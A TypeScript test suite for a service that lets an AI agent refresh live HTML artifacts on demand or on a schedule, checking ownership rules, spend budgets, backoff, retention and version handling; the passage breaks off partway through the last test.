/**
 * Agent refresh of a live artifact (docs/ARTIFACTS.md#agent-refresh) over
 * embedded PGlite and the real REST routes. The agent run is a scripted
 * double (`runRefreshAgent` replaced by a queue of scripted replies), so no
 * model is called; the last suite runs the real runner with a scripted
 * worker to pin what the agent is given.
 */
import { randomBytes, randomUUID } from 'node:crypto';
import { existsSync, mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeAll, describe, expect, test, vi } from 'vitest';
import type { RefreshRunInput } from './agent-refresh-runner';

const rand = (n: number) => randomBytes(n).toString('hex');
process.env.MASTER_KEY ??= `test-master-${rand(24)}`;
process.env.JWT_SECRET ??= `test-jwt-${rand(24)}`;
process.env.SESSION_SECRET ??= `test-session-${rand(24)}`;
process.env.LOG_LEVEL ??= 'error';

type Step = { reply: string } | { fail: Error } | { wait: Promise<string> };
const script = vi.hoisted(() => ({ steps: [] as Step[], calls: [] as RefreshRunInput[] }));
vi.mock('./agent-refresh-runner', async (importOriginal) => {
  const actual = await importOriginal<typeof import('./agent-refresh-runner')>();
  return {
    ...actual,
    runRefreshAgent: async (input: RefreshRunInput) => {
      script.calls.push(input);
      const step = script.steps.shift();
      if (!step) throw new Error('scripted runner: no step left');
      if ('fail' in step) throw step.fail;
      if ('wait' in step) return step.wait;
      return step.reply;
    },
  };
});

const policy = vi.hoisted(() => ({ retentionDays: 0, trashDays: 30 }));
// The artifact host, switchable per test (subdomain mode when set).
const hosting = vi.hoisted(() => ({ host: '' }));
vi.mock('@/core/artifacts/settings', async (importOriginal) => {
  const actual = await importOriginal<typeof import('@/core/artifacts/settings')>();
  return {
    ...actual,
    resolveArtifactRetention: () => ({ ...policy }),
    resolveArtifactSettings: () => ({ ...actual.resolveArtifactSettings(), host: hosting.host, proto: 'https' as const }),
  };
});

// The real runner's worker, scripted (last suite).
const worker = vi.hoisted(() => ({ spawn: null as null | ((...args: unknown[]) => Promise<unknown>) }));
vi.mock('@/core/agent', async (importOriginal) => {
  const actual = await importOriginal<typeof import('@/core/agent')>();
  return {
    ...actual,
    getAgentService: () => ({ spawnWorker: (...args: unknown[]) => worker.spawn!(...args) }),
  };
});

// The agent tool's write permission (an ASK) is allowed, as in the slug suite.
vi.mock('@/security/permissions', () => ({
  getPermissionManager: () => ({
    onRequest: () => () => {},
    onResolved: () => () => {},
    check: async () => ({ level: 'ALLOW', source: 'policy' }),
  }),
}));

const DAY = 24 * 60 * 60 * 1000;
const alice = randomUUID();
const bob = randomUUID();
type App = { handle(request: Request): Promise<Response> };
let app: App;
const tokens: Record<string, string> = {};

const PAGE = '```html\n<h1>Fresh</h1><button onclick="go()">go</button><script>function go(){ document.title = "y"; }</script>\n```\n```css\nh1 { color: red; }\n```';

afterEach(() => {
  script.steps.length = 0;
  script.calls.length = 0;
  policy.retentionDays = 0;
  vi.useRealTimers();
});

async function call(method: string, path: string, opts: { body?: unknown; as?: string; auth?: string } = {}): Promise<Response> {
  const headers: Record<string, string> = {};
  if (opts.auth !== undefined) headers.authorization = opts.auth;
  else headers.authorization = `Bearer ${tokens[opts.as ?? alice]}`;
  if (opts.body !== undefined) headers['content-type'] = 'application/json';
  return app.handle(new Request(`http://localhost${path}`, { method, headers, body: opts.body === undefined ? undefined : JSON.stringify(opts.body) }));
}

beforeAll(async () => {
  process.env.STORAGE_MODE = 'embedded';
  process.env.DATA_DIR = mkdtempSync(join(tmpdir(), 'octipus-artifact-agent-refresh-'));
  const { initializeDb } = await import('@/db/postgres');
  await initializeDb();
  const { runMigrations } = await import('@/db/migrate');
  await runMigrations();
  const { initializeStorage } = await import('@/db/storage');
  // In-memory queue and pub/sub, as an embedded install runs them.
  initializeStorage({ mode: 'embedded' });
  const { seedUsers } = await import('@/test-helpers/multiuser-fixtures');
  await seedUsers([{ id: alice, username: 'refresh-alice' }, { id: bob, username: 'refresh-bob' }]);
  const { getSessionManager } = await import('@/security/auth/session');
  tokens[alice] = (await getSessionManager().create(alice)).token;
  tokens[bob] = (await getSessionManager().create(bob)).token;
  const { createServer } = await import('@/api/server');
  app = createServer();
}, 120_000);

/** An artifact of alice with one version and a stored refresh instruction. */
async function seed(slug: string, instruction = 'List this week\'s Rust releases'): Promise<{ id: string; versionId: string; workspaceId: string }> {
  const res = await call('POST', '/api/artifacts', { body: { slug, title: slug, type: 'html', htmlTemplate: '<p>old</p>' } });
  expect(res.status).toBe(201);
  const { artifact } = await res.json();
  expect((await call('PUT', `/api/artifacts/${artifact.id}/agent-refresh`, { body: { instruction } })).status).toBe(200);
  return { id: artifact.id, versionId: artifact.currentVersionId, workspaceId: artifact.workspaceId };
}

async function state(id: string) {
  const res = await call('GET', `/api/artifacts/${id}/agent-refresh`);
  expect(res.status).toBe(200);
  return (await res.json()).refresh as import('@/shared/artifacts').AgentRefreshView;
}

async function current(id: string) {
  const { artifactsRepository } = await import('@/db/repositories/artifacts-repository');
  const a = await artifactsRepository.getById(id);
  return { versionId: a?.currentVersionId ?? null, versions: (await artifactsRepository.listVersions(id)).length };
}

function taskOf(artifactId: string, chain: string): import('@/core/scheduler').ScheduledTask {
  return { payload: { artifactId, chain } } as unknown as import('@/core/scheduler').ScheduledTask;
}

async function settled(id: string): Promise<import('@/shared/artifacts').AgentRefreshView> {
  for (let i = 0; i < 200; i++) {
    const s = await state(id);
    if (!s.running && s.lastOutcome) return s;
    await new Promise((r) => setTimeout(r, 20));
  }
  throw new Error('refresh did not settle');
}

describe('manual refresh by the owner', () => {
  test('a successful run replaces the page atomically with a new current version', async () => {
    const a = await seed('manual-ok');
    script.steps.push({ reply: PAGE });
    expect((await call('POST', `/api/artifacts/${a.id}/agent-refresh/run`)).status).toBe(202);
    const s = await settled(a.id);
    expect(s).toMatchObject({ lastOutcome: 'success', lastError: null, consecutiveFailures: 0 });
    expect(s.lastSuccessAt).not.toBeNull();

    const after = await current(a.id);
    expect(after.versionId).not.toBe(a.versionId);
    expect(after.versions).toBe(2);
    const { artifactsRepository } = await import('@/db/repositories/artifacts-repository');
    const v = await artifactsRepository.getVersion(after.versionId!);
    expect(v?.htmlTemplate).toContain('<h1>Fresh</h1>');
    expect(v?.htmlTemplate).not.toContain('<script');
    expect(v?.css).toBe('h1 { color: red; }');
    expect(v?.changeSummary).toBe('agent refresh');
    const { bundleFilePath } = await import('./bundler');
    expect(existsSync(bundleFilePath(a.id, after.versionId!))).toBe(true);

    // The run was the owner's, from the stored instruction only.
    expect(script.calls).toHaveLength(1);
    expect(script.calls[0]).toMatchObject({ ownerUserId: alice, instruction: 'List this week\'s Rust releases', knowledgeAccess: false, trigger: 'user', workspaceId: a.workspaceId });
    expect(JSON.stringify(script.calls[0])).not.toContain('<p>old</p>');
  });

  test('a failed run keeps the current version and records the error', async () => {
    const a = await seed('manual-fail');
    script.steps.push({ fail: new Error('model unavailable') });
    expect((await call('POST', `/api/artifacts/${a.id}/agent-refresh/run`)).status).toBe(202);
    const s = await settled(a.id);
    expect(s).toMatchObject({ lastOutcome: 'failed', lastError: 'model unavailable', lastSuccessAt: null });
    expect(await current(a.id)).toEqual({ versionId: a.versionId, versions: 1 });

    // A run that returns no valid page is a failure too, and leaves no version behind.
    script.steps.push({ reply: 'I could not find anything new.' });
    expect((await call('POST', `/api/artifacts/${a.id}/agent-refresh/run`)).status).toBe(202);
    expect(await settled(a.id)).toMatchObject({ lastOutcome: 'failed', lastError: 'The agent did not return a ```html block' });
    expect(await current(a.id)).toEqual({ versionId: a.versionId, versions: 1 });
  });

  test('an edit made while the run was going wins; the refreshed page is discarded', async () => {
    const a = await seed('edited-meanwhile');
    let release!: (s: string) => void;
    script.steps.push({ wait: new Promise<string>((r) => { release = r; }) });
    expect((await call('POST', `/api/artifacts/${a.id}/agent-refresh/run`)).status).toBe(202);
    expect((await call('PUT', `/api/artifacts/${a.id}`, { body: { htmlTemplate: '<p>edited by hand</p>' } })).status).toBe(200);
    const edited = await current(a.id);
    release(PAGE);
    const s = await settled(a.id);
    expect(s.lastOutcome).toBe('failed');
    expect(s.lastError).toMatch(/edited, restored or deleted/);
    expect(await current(a.id)).toEqual(edited);
  });

  test('concurrent refresh requests start one run', async () => {
    const a = await seed('concurrent');
    let release!: (s: string) => void;
    script.steps.push({ wait: new Promise<string>((r) => { release = r; }) }, { reply: PAGE });
    const statuses = (await Promise.all([1, 2, 3].map(() => call('POST', `/api/artifacts/${a.id}/agent-refresh/run`)))).map((r) => r.status).sort();
    expect(statuses).toEqual([202, 409, 409]);
    expect((await state(a.id)).running).toBe(true);
    release(PAGE);
    expect((await settled(a.id)).lastOutcome).toBe('success');
    expect(script.calls).toHaveLength(1);
    expect(script.steps).toHaveLength(1);
  });

  test('a paused spend budget refuses the run before any agent starts, and the refusal is recorded', async () => {
    const a = await seed('budget');
    const { upsertBudget, deleteBudget, _resetSpendBudgetsForTests } = await import('@/security/spend-budgets');
    const budget = await upsertBudget({ userId: alice, scopeKind: 'user', period: 'month', limitUsd: 5 });
    const { getDb } = await import('@/db/postgres');
    const { spendBudgets } = await import('@/db/schema/spend-budgets');
    const { eq } = await import('drizzle-orm');
    await getDb().update(spendBudgets).set({ pausedAt: new Date() }).where(eq(spendBudgets.id, budget.id));
    _resetSpendBudgetsForTests();
    try {
      const res = await call('POST', `/api/artifacts/${a.id}/agent-refresh/run`);
      expect(res.status).toBe(422);
      expect(await res.json()).toMatchObject({ code: 'refresh_refused' });
      const s = await state(a.id);
      expect(s.running).toBe(false);
      expect(s.lastOutcome).toBe('refused');
      expect(s.lastError).toMatch(/Spend budget exceeded/);
      expect(script.calls).toHaveLength(0);
      expect(await current(a.id)).toEqual({ versionId: a.versionId, versions: 1 });
    } finally {
      await deleteBudget(budget.id);
      _resetSpendBudgetsForTests();
    }
  });
});

describe('who can trigger a refresh', () => {
  test('a user outside the workspace cannot see or start it', async () => {
    const a = await seed('not-bobs');
    expect((await call('POST', `/api/artifacts/${a.id}/agent-refresh/run`, { as: bob })).status).toBe(404);
    expect((await call('GET', `/api/artifacts/${a.id}/agent-refresh`, { as: bob })).status).toBe(404);
    expect((await call('PUT', `/api/artifacts/${a.id}/agent-refresh`, { as: bob, body: { instruction: 'x' } })).status).toBe(404);
    expect(script.calls).toHaveLength(0);
  });

  test('a member who can see and edit the artifact but does not own it gets 403, and nothing runs', async () => {
    const a = await seed('someone-elses');
    // Alice's workspace holds it, but bob created it: alice may view and edit it, not spend on it.
    const { getDb } = await import('@/db/postgres');
    const { artifacts } = await import('@/db/schema/artifacts');
    const { eq } = await import('drizzle-orm');
    await getDb().update(artifacts).set({ createdByUserId: bob }).where(eq(artifacts.id, a.id));
    expect((await call('GET', `/api/artifacts/${a.id}`)).status).toBe(200);
    for (const [method, path, body] of [
      ['POST', `/api/artifacts/${a.id}/agent-refresh/run`, undefined],
      ['GET', `/api/artifacts/${a.id}/agent-refresh`, undefined],
      ['PUT', `/api/artifacts/${a.id}/agent-refresh`, { instruction: 'spend my budget', intervalMinutes: 60 }],
    ] as const) {
      const res = await call(method, path, { body });
      expect(res.status).toBe(403);
      expect(await res.json()).toMatchObject({ code: 'not_owner' });
    }
    // And the stored row was not touched by the attempt.
    const { artifactRefreshRepository } = await import('@/db/repositories/artifact-refresh-repository');
    expect((await artifactRefreshRepository.get(a.id))?.instruction).toBe('List this week\'s Rust releases');
    expect(script.calls).toHaveLength(0);
  });

  test('an embed viewer token cannot start a refresh by any route', async () => {
    const a = await seed('viewer-token', 'x');
    expect((await call('PUT', `/api/artifacts/${a.id}`, { body: { visibility: 'public' } })).status).toBe(200);
    const { signArtifactToken } = await import('./token');
    const now = Math.floor(Date.now() / 1000);
    const vt = signArtifactToken({ aid: a.id, wid: a.workspaceId, scope: 'view', iat: now, exp: now + 300 });
    const run = `/api/artifacts/${a.id}/agent-refresh/run`;
    expect((await call('POST', run, { auth: `Bearer ${vt}` })).status).toBe(401);
    expect((await call('POST', run, { auth: `ArtifactToken ${vt}` })).status).toBe(401);
    expect((await call('POST', `${run}?vt=${encodeURIComponent(vt)}`, { auth: '' })).status).toBe(401);
    // The hosted page routes have no refresh at all, signed in or not.
    expect((await call('POST', `/__artifacts__/a/viewer-token/agent-refresh/run?vt=${encodeURIComponent(vt)}`, { auth: '' })).status).toBe(404);
    expect((await call('POST', '/__artifacts__/a/viewer-token/refresh', { auth: '' })).status).toBe(404);
    expect(script.calls).toHaveLength(0);
    expect((await state(a.id)).lastAttemptAt).toBeNull();
  });
});

describe('the schedule', () => {
  test('an owner schedule below the minimum interval is refused', async () => {
    const a = await seed('too-often');
    expect((await call('PUT', `/api/artifacts/${a.id}/agent-refresh`, { body: { intervalMinutes: 5 } })).status).toBe(400);
    expect((await state(a.id)).intervalMinutes).toBeNull();
  });

  test('a schedule fires through the shared scheduler, then re-arms one interval later', async () => {
    const a = await seed('scheduled');
    const { getScheduler } = await import('@/core/scheduler');
    const { registerAgentRefreshHandler } = await import('./agent-refresh');
    registerAgentRefreshHandler();
    const res = await call('PUT', `/api/artifacts/${a.id}/agent-refresh`, { body: { intervalMinutes: 60 } });
    expect(res.status).toBe(200);
    const armed = (await res.json()).refresh;
    expect(armed.intervalMinutes).toBe(60);
    const due = new Date(armed.nextRunAt).getTime();
    expect(due - Date.now()).toBeGreaterThan(59 * 60_000);

    script.steps.push({ reply: PAGE });
    vi.useFakeTimers({ toFake: ['Date'] });
    vi.setSystemTime(due + 1000);
    const scheduler = getScheduler();
    scheduler.start(1);
    try {
      const s = await settled(a.id);
      expect(s.lastOutcome).toBe('success');
      expect(script.calls[0]?.trigger).toBe('schedule');
      // Re-armed under the same chain, one interval after this run.
      for (let i = 0; i < 100 && (await state(a.id)).nextRunAt === armed.nextRunAt; i++) await new Promise((r) => setTimeout(r, 20));
      expect(new Date((await state(a.id)).nextRunAt!).getTime()).toBeGreaterThan(due + 59 * 60_000);
    } finally {
      await scheduler.stop();
    }
    expect((await current(a.id)).versions).toBe(2);
  });

  test('a schedule that keeps failing backs off, then turns itself off and tells the owner', async () => {
    const a = await seed('flaky');
    const { artifactRefreshRepository } = await import('@/db/repositories/artifact-refresh-repository');
    const { runScheduledAttempt, MAX_SCHEDULE_FAILURES, nextScheduleDelayMs, setAgentRefreshSchedule } = await import('./agent-refresh');
    await setAgentRefreshSchedule(a.id, 60);
    const chain = (await artifactRefreshRepository.get(a.id))!.scheduleChain!;
    const notify = vi.fn(async () => {});
    const task = taskOf(a.id, chain);
    for (let i = 1; i <= MAX_SCHEDULE_FAILURES; i++) {
      script.steps.push({ fail: new Error(`upstream down ${i}`) });
      const before = Date.now();
      await (await runScheduledAttempt(task, { notify })).settled;
      const row = (await artifactRefreshRepository.get(a.id))!;
      expect(row.consecutiveFailures).toBe(i);
      if (i < MAX_SCHEDULE_FAILURES) {
        expect(row.nextRunAt!.getTime() - before).toBeGreaterThanOrEqual(nextScheduleDelayMs(60, i) - 1000);
      }
    }
    expect(nextScheduleDelayMs(60, 1)).toBe(2 * 60 * 60_000);
    expect(nextScheduleDelayMs(60, 10)).toBe(24 * 60 * 60_000);
    // Never sooner than the interval itself: a weekly schedule stays weekly.
    expect(nextScheduleDelayMs(7 * 24 * 60, 3)).toBe(7 * DAY);
    const s = await state(a.id);
    expect(s.intervalMinutes).toBeNull();
    expect(s.nextRunAt).toBeNull();
    expect(s.scheduleDisabledReason).toMatch(/5 scheduled refreshes in a row.*upstream down 5/);
    expect(notify).toHaveBeenCalledTimes(1);
    expect(notify).toHaveBeenCalledWith(alice, 'artifact_refresh_disabled', expect.stringContaining('flaky'), expect.any(String), { artifactId: a.id });
    // The old chain's next task ends without running.
    await (await runScheduledAttempt(task, { notify })).settled;
    expect(script.calls).toHaveLength(MAX_SCHEDULE_FAILURES);
    // The current version was never replaced.
    expect(await current(a.id)).toEqual({ versionId: a.versionId, versions: 1 });
  });

  test('an error before the attempt is recorded and the schedule still re-arms', async () => {
    const a = await seed('broken-attempt');
    const { artifactRefreshRepository } = await import('@/db/repositories/artifact-refresh-repository');
    const { runScheduledAttempt, setAgentRefreshSchedule } = await import('./agent-refresh');
    await setAgentRefreshSchedule(a.id, 60);
    const before = (await artifactRefreshRepository.get(a.id))!;
    const spy = vi.spyOn(artifactRefreshRepository, 'claimRun').mockRejectedValueOnce(new Error('database went away'));
    try {
      await (await runScheduledAttempt(taskOf(a.id, before.scheduleChain!))).settled;
    } finally {
      spy.mockRestore();
    }
    const after = (await artifactRefreshRepository.get(a.id))!;
    expect(after.lastOutcome).toBe('failed');
    expect(after.lastError).toMatch(/could not run: database went away/);
    expect(after.consecutiveFailures).toBe(1);
    expect(after.scheduleChain).toBe(before.scheduleChain);
    expect(after.nextRunAt!.getTime()).toBeGreaterThan(before.nextRunAt!.getTime());
    expect(script.calls).toHaveLength(0);
  });

  test('a scheduled attempt does not hold the scheduler while the agent runs; it re-arms when the run ends', async () => {
    const a = await seed('non-blocking');
    const { artifactRefreshRepository } = await import('@/db/repositories/artifact-refresh-repository');
    const { runScheduledAttempt, setAgentRefreshSchedule } = await import('./agent-refresh');
    await setAgentRefreshSchedule(a.id, 60);
    const armed = (await artifactRefreshRepository.get(a.id))!;
    let release!: (s: string) => void;
    script.steps.push({ wait: new Promise<string>((r) => { release = r; }) });
    const { settled } = await runScheduledAttempt(taskOf(a.id, armed.scheduleChain!));
    // Returned with the run still going.
    expect((await state(a.id)).running).toBe(true);
    expect((await artifactRefreshRepository.get(a.id))!.nextRunAt!.getTime()).toBe(armed.nextRunAt!.getTime());
    release(PAGE);
    await settled;
    expect((await state(a.id)).lastOutcome).toBe('success');
    expect((await artifactRefreshRepository.get(a.id))!.nextRunAt!.getTime()).toBeGreaterThan(armed.nextRunAt!.getTime());
  });

  test('agent refreshes are capped per process: a scheduled one waits without failing, a manual one gets 429', async () => {
    const { MAX_CONCURRENT_AGENT_REFRESHES, runScheduledAttempt, setAgentRefreshSchedule } = await import('./agent-refresh');
    const { artifactRefreshRepository } = await import('@/db/repositories/artifact-refresh-repository');
    const releases: Array<(s: string) => void> = [];
    const running = [];
    for (let i = 0; i < MAX_CONCURRENT_AGENT_REFRESHES; i++) {
      const a = await seed(`cap-${i}`);
      script.steps.push({ wait: new Promise<string>((r) => { releases.push(r); }) });
      expect((await call('POST', `/api/artifacts/${a.id}/agent-refresh/run`)).status).toBe(202);
      running.push(a);
    }
    const extra = await seed('cap-extra');
    const res = await call('POST', `/api/artifacts/${extra.id}/agent-refresh/run`);
    expect(res.status).toBe(429);
    expect(await res.json()).toMatchObject({ code: 'refresh_capacity' });

    await setAgentRefreshSchedule(extra.id, 60);
    const chain = (await artifactRefreshRepository.get(extra.id))!.scheduleChain!;
    const t0 = Date.now();
    await (await runScheduledAttempt(taskOf(extra.id, chain))).settled;
    const row = (await artifactRefreshRepository.get(extra.id))!;
    expect(row.consecutiveFailures).toBe(0);
    expect(row.lastAttemptAt).toBeNull();
    const wait = row.nextRunAt!.getTime() - t0;
    expect(wait).toBeGreaterThanOrEqual(5 * 60_000 - 1000);
    expect(wait).toBeLessThanOrEqual(10 * 60_000 + 1000);
    expect(script.calls).toHaveLength(MAX_CONCURRENT_AGENT_REFRESHES);

    for (const r of releases) r(PAGE);
    for (const a of running) expect((await settled(a.id)).lastOutcome).toBe('success');
  });

  test('boot re-arms an overdue schedule with jitter, not all at once', async () => {
    const a = await seed('boot-overdue');
    const { artifactRefreshRepository } = await import('@/db/repositories/artifact-refresh-repository');
    const { bootstrapAgentRefreshSchedules, BOOT_JITTER_MS, setAgentRefreshSchedule } = await import('./agent-refresh');
    await setAgentRefreshSchedule(a.id, 60);
    const { getDb } = await import('@/db/postgres');
    const { artifactAgentRefresh } = await import('@/db/schema/artifact-agent-refresh');
    const { eq } = await import('drizzle-orm');
    await getDb().update(artifactAgentRefresh).set({ nextRunAt: new Date(Date.now() - DAY) }).where(eq(artifactAgentRefresh.artifactId, a.id));
    const { getScheduler } = await import('@/core/scheduler');
    const schedule = vi.spyOn(getScheduler(), 'schedule');
    const random = vi.spyOn(Math, 'random').mockReturnValue(0.5);
    try {
      await bootstrapAgentRefreshSchedules();
      const mine = schedule.mock.calls.find((c) => (c[2] as { artifactId?: string }).artifactId === a.id);
      expect(mine?.[3]?.delayMs).toBe(BOOT_JITTER_MS / 2);
      expect((await artifactRefreshRepository.get(a.id))!.scheduleChain).toBe((mine?.[2] as { chain: string }).chain);
    } finally {
      schedule.mockRestore();
      random.mockRestore();
    }
  });

  test('setting the interval it already runs at mints no new chain and keeps the failure count', async () => {
    const a = await seed('same-interval');
    const { artifactRefreshRepository } = await import('@/db/repositories/artifact-refresh-repository');
    expect((await call('PUT', `/api/artifacts/${a.id}/agent-refresh`, { body: { intervalMinutes: 60 } })).status).toBe(200);
    const { getDb } = await import('@/db/postgres');
    const { artifactAgentRefresh } = await import('@/db/schema/artifact-agent-refresh');
    const { eq } = await import('drizzle-orm');
    await getDb().update(artifactAgentRefresh).set({ consecutiveFailures: 2 }).where(eq(artifactAgentRefresh.artifactId, a.id));
    const before = (await artifactRefreshRepository.get(a.id))!;
    expect((await call('PUT', `/api/artifacts/${a.id}/agent-refresh`, { body: { intervalMinutes: 60 } })).status).toBe(200);
    const after = (await artifactRefreshRepository.get(a.id))!;
    expect(after.scheduleChain).toBe(before.scheduleChain);
    expect(after.consecutiveFailures).toBe(2);
    expect(after.nextRunAt!.getTime()).toBe(before.nextRunAt!.getTime());
  });

  test('a schedule nobody opens pauses after the idle window, with one notice, and runs nothing', async () => {
    const a = await seed('unviewed');
    const { artifactRefreshRepository } = await import('@/db/repositories/artifact-refresh-repository');
    const { DEFAULT_IDLE_DAYS, runScheduledAttempt, setAgentRefreshSchedule } = await import('./agent-refresh');
    await setAgentRefreshSchedule(a.id, 60);
    const chain = (await artifactRefreshRepository.get(a.id))!.scheduleChain!;
    const { getDb } = await import('@/db/postgres');
    const { artifactAgentRefresh } = await import('@/db/schema/artifact-agent-refresh');
    const { artifacts } = await import('@/db/schema/artifacts');
    const { eq } = await import('drizzle-orm');
    const long = new Date(Date.now() - (DEFAULT_IDLE_DAYS + 1) * DAY);
    await getDb().update(artifactAgentRefresh).set({ scheduleSetAt: long }).where(eq(artifactAgentRefresh.artifactId, a.id));
    await getDb().update(artifacts).set({ lastViewedAt: long }).where(eq(artifacts.id, a.id));
    const notify = vi.fn(async () => {});
    script.steps.push({ reply: PAGE });
    await (await runScheduledAttempt(taskOf(a.id, chain), { notify })).settled;
    await (await runScheduledAttempt(taskOf(a.id, chain), { notify })).settled;
    expect(script.calls).toHaveLength(0);
    const s = await state(a.id);
    expect(s.intervalMinutes).toBeNull();
    expect(s.scheduleDisabledReason).toMatch(/nobody has opened this artifact in 30 days/);
    expect(notify).toHaveBeenCalledTimes(1);
    expect(notify).toHaveBeenCalledWith(alice, 'artifact_refresh_paused', expect.any(String), expect.any(String), { artifactId: a.id });

    // A retention policy sets the window instead.
    const b = await seed('unviewed-retention');
    await setAgentRefreshSchedule(b.id, 60);
    const chainB = (await artifactRefreshRepository.get(b.id))!.scheduleChain!;
    await getDb().update(artifactAgentRefresh).set({ scheduleSetAt: new Date(Date.now() - 11 * DAY) }).where(eq(artifactAgentRefresh.artifactId, b.id));
    policy.retentionDays = 10;
    await (await runScheduledAttempt(taskOf(b.id, chainB), { notify })).settled;
    expect((await state(b.id)).scheduleDisabledReason).toMatch(/in 10 days/);
  });

  test('a refresh does not count as activity for retention', async () => {
    const a = await seed('no-retention-bump');
    const { getDb } = await import('@/db/postgres');
    const { artifacts } = await import('@/db/schema/artifacts');
    const { eq } = await import('drizzle-orm');
    const old = new Date(Date.now() - 100 * DAY);
    await getDb().update(artifacts).set({ updatedAt: old }).where(eq(artifacts.id, a.id));
    script.steps.push({ reply: PAGE });
    expect((await call('POST', `/api/artifacts/${a.id}/agent-refresh/run`)).status).toBe(202);
    expect((await settled(a.id)).lastOutcome).toBe('success');
    const [row] = await getDb().select().from(artifacts).where(eq(artifacts.id, a.id));
    expect(row.updatedAt.getTime()).toBe(old.getTime());
    policy.retentionDays = 90;
    const { runArtifactCleanup } = await import('./cleanup');
    await runArtifactCleanup();
    const [expired] = await getDb().select().from(artifacts).where(eq(artifacts.id, a.id));
    expect(expired.deletedAt).toBeInstanceOf(Date);
  });

  test('retention expiry cancels the schedule, and its queued task runs nothing', async () => {
    const a = await seed('expiring');
    const { artifactRefreshRepository } = await import('@/db/repositories/artifact-refresh-repository');
    const { runScheduledAttempt, setAgentRefreshSchedule } = await import('./agent-refresh');
    await setAgentRefreshSchedule(a.id, 60);
    const chain = (await artifactRefreshRepository.get(a.id))!.scheduleChain!;
    const { getDb } = await import('@/db/postgres');
    const { artifacts } = await import('@/db/schema/artifacts');
    const { eq } = await import('drizzle-orm');
    await getDb().update(artifacts).set({ updatedAt: new Date(Date.now() - 100 * DAY) }).where(eq(artifacts.id, a.id));

    policy.retentionDays = 90;
    const { runArtifactCleanup } = await import('./cleanup');
    expect((await runArtifactCleanup()).expiredArtifacts).toBeGreaterThanOrEqual(1);
    const row = (await artifactRefreshRepository.get(a.id))!;
    expect(row.scheduleChain).toBeNull();
    expect(row.intervalMinutes).toBeNull();
    expect(row.scheduleDisabledReason).toMatch(/expired after 90 days/);

    script.steps.push({ reply: PAGE });
    await (await runScheduledAttempt(taskOf(a.id, chain))).settled;
    expect(script.calls).toHaveLength(0);
    // And a manual request has nothing to refresh.
    const { startAgentRefresh } = await import('./agent-refresh');
    expect(await startAgentRefresh(a.id, 'user')).toEqual({ status: 'unavailable', error: 'Artifact not found' });
  });

  test('a deleted artifact stops its schedule at the next fire', async () => {
    const a = await seed('deleted-scheduled');
    const { artifactRefreshRepository } = await import('@/db/repositories/artifact-refresh-repository');
    const { runScheduledAttempt, setAgentRefreshSchedule } = await import('./agent-refresh');
    await setAgentRefreshSchedule(a.id, 60);
    const chain = (await artifactRefreshRepository.get(a.id))!.scheduleChain!;
    expect((await call('DELETE', `/api/artifacts/${a.id}`)).status).toBe(200);
    await (await runScheduledAttempt(taskOf(a.id, chain))).settled;
    expect(script.calls).toHaveLength(0);
    expect((await artifactRefreshRepository.get(a.id))?.scheduleDisabledReason).toBe('The artifact was deleted');
  });
});

describe('versions', () => {
  test('an identical page writes no version, and only the newest refresh versions are kept', async () => {
    const a = await seed('versions');
    const { KEEP_REFRESH_VERSIONS } = await import('./agent-refresh');
    script.steps.push({ reply: PAGE });
    expect((await call('POST', `/api/artifacts/${a.id}/agent-refresh/run`)).status).toBe(202);
    await settled(a.id);
    const first = await current(a.id);
    expect(first.versions).toBe(2);
    script.steps.push({ reply: PAGE });
    expect((await call('POST', `/api/artifacts/${a.id}/agent-refresh/run`)).status).toBe(202);
    expect((await settled(a.id)).lastOutcome).toBe('success');
    expect(await current(a.id)).toEqual(first);

    for (let i = 0; i < KEEP_REFRESH_VERSIONS + 3; i++) {
      script.steps.push({ reply: `\`\`\`html\n<p>page ${i}</p>\n\`\`\`` });
      expect((await call('POST', `/api/artifacts/${a.id}/agent-refresh/run`)).status).toBe(202);
      for (let w = 0; w < 200 && (await state(a.id)).running; w++) await new Promise((r) => setTimeout(r, 20));
    }
    const { artifactsRepository } = await import('@/db/repositories/artifacts-repository');
    const versions = await artifactsRepository.listVersions(a.id);
    // The owner's own version, plus the newest refresh versions only.
    expect(versions).toHaveLength(1 + KEEP_REFRESH_VERSIONS);
    expect(versions.some((v) => v.id === a.versionId)).toBe(true);
    expect((await artifactsRepository.getVersion((await current(a.id)).versionId!))?.htmlTemplate).toBe(`<p>page ${KEEP_REFRESH_VERSIONS + 2}</p>`);
  });

  test('a version left by a run that crashed before making it current is removed by the next run', async () => {
    const a = await seed('crashed-version');
    const { artifactsRepository } = await import('@/db/repositories/artifacts-repository');
    const { artifactRefreshRepository } = await import('@/db/repositories/artifact-refresh-repository');
    const orphan = randomUUID();
    await artifactRefreshRepository.setPendingVersion(a.id, orphan);
    await artifactsRepository.createVersion({ id: orphan, artifactId: a.id, htmlTemplate: '<p>half</p>', changeSummary: 'agent refresh' });
    expect((await current(a.id)).versions).toBe(2);
    script.steps.push({ fail: new Error('nothing new') });
    expect((await call('POST', `/api/artifacts/${a.id}/agent-refresh/run`)).status).toBe(202);
    await settled(a.id);
    expect(await artifactsRepository.getVersion(orphan)).toBeNull();
    expect(await current(a.id)).toEqual({ versionId: a.versionId, versions: 1 });
    expect((await artifactRefreshRepository.get(a.id))?.pendingVersionId).toBeNull();
  });
});

describe('the instruction and its tools', () => {
  test('one stored by create_live_artifact is marked as the agent\'s, and the tool cannot schedule it or open knowledge', async () => {
    const { ArtifactsTool } = await import('@/tools/artifacts');
    const tool = new ArtifactsTool();
    await tool.initialize();
    const create = tool.getToolHandlers().find((h) => h.name === 'artifacts__create_live_artifact')!;
    const props = Object.keys((create.parameters as { properties: Record<string, unknown> }).properties);
    expect(props).toContain('refresh_instruction');
    expect(props.filter((p) => /interval|schedule|knowledge/.test(p))).toEqual([]);
    const { workspaceId } = await seed('tool-ws-probe');
    const ctx = {
      space: null, trigger: 'user', funding: 'own', id: randomUUID(), sessionId: randomUUID(), userId: alice, workspaceId,
      topic: 'test', model: 'test', role: 'general', status: 'running', createdAt: new Date(), updatedAt: new Date(), metadata: {},
    } as unknown as import('@/core/types').AgentContext;
    const made = await create.execute({
      slug: 'tool-made', title: 'Tool made', type: 'html', html_template: '<p>x</p>',
      refresh_instruction: 'Weekly Rust news', refresh_interval_minutes: 60, knowledge_access: true,
    }, ctx) as { id: string };
    const s = await state(made.id);
    expect(s).toMatchObject({ instruction: 'Weekly Rust news', instructionSetBy: 'agent', intervalMinutes: null, knowledgeAccess: false });
    // The owner saving it makes it theirs.
    const saved = await (await call('PUT', `/api/artifacts/${made.id}/agent-refresh`, { body: { instruction: 'Weekly Rust news' } })).json();
